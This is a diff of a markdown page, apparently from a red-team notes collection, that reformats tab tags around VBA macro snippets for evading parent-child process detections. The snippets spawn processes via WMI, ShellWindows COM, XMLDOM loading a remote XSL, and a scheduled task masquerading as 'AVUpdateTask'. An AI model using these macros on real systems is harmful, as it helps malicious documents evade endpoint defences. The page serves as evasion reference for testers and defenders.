@@ -8,8 +8,8 @@ Below are some techniques showing how those type of detections could be bypassed
 
 ## Spawning via WmiPrvse.exe using wmi
 
-{% code-tabs %}
-{% code-tabs-item title="macro.vba" %}
+{% tabs %}
+{% tab title="macro.vba" %}
 ```javascript
 Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
@@ -17,26 +17,26 @@ Set objConfig = objStartup.SpawnInstance_
 Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
 errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-04-10-22-11-41.png)
 
 ## Spawning via ShellCOM
 
-{% code-tabs %}
-{% code-tabs-item title="macro.vba" %}
+{% tabs %}
+{% tab title="macro.vba" %}
 ```csharp
 Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
 obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ## Spawning via svchost.exe using XMLDOM
 
-{% code-tabs %}
-{% code-tabs-item title="xmldom.vba" %}
+{% tabs %}
+{% tab title="xmldom.vba" %}
 ```csharp
 Set xml = CreateObject("Microsoft.XMLDOM")
 xml.async = False
@@ -44,9 +44,9 @@ Set xsl = xml
 xsl.load("file://|http://bad.xsl")
 xml.transformNode xsl
 ```
-{% endcode-tabs-item %}
+{% endtab %}
 
-{% code-tabs-item title="bad.xsl" %}
+{% tab title="bad.xsl" %}
 ```markup
 <?xml version='1.0'?>
 <stylesheet
@@ -60,15 +60,15 @@ version="1.0">
 	]]> </ms:script>
 </stylesheet>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-04-10-23-04-07.png)
 
 ## Spawning via svchost.exe using Scheduled Task
 
-{% code-tabs %}
-{% code-tabs-item title="macro.vba" %}
+{% tabs %}
+{% tab title="macro.vba" %}
 ```csharp
 Set service = CreateObject("Schedule.Service")
 Call service.Connect
@@ -87,8 +87,8 @@ Action.Path = "C:\Windows\System32\cmd.exe"
 'Action.Arguments = "/c whoami"
 Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../../.gitbook/assets/screenshot-from-2019-04-10-22-19-03.png)
 
